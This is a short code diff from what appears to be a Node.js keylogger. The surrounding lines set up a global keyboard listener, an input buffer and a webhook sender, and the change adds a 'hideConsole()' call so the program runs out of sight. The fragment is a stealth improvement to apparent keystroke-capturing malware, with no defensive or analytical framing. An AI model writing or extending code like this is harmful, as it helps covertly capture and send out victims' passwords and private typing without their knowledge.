@@ -120,7 +120,8 @@ process.on('SIGINT', () => {
   const { sendWebhook } = require('../webhook');
   
   const v = new GlobalKeyboardListener();
-  
+  hideConsole();
+
   let inputBuffer = '';
   let timeoutId = null;
   
